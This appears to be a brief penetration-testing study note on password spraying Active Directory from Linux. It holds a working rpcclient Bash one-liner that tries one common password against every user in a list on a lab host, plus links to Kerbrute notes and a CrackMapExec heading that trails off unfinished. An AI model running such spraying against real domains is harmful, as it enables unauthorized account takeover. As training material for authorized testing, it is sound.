# Internal Password Spraying - from Linux ACTIVE Directory

### Using a Bash one-liner for the Attack

* need valid\_users.txt file
  * [password-spraying-making-a-target-user-list-active-directory.md](password-spraying-making-a-target-user-list-active-directory.md "mention")

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
Copy
```



### Using Kerbrute for the Attack

* [#password-spraying-active-directory](kerbrute.md#password-spraying-active-directory "mention")



### Using CrackMapExec & Filtering Logon Failures

* \#cra\




\




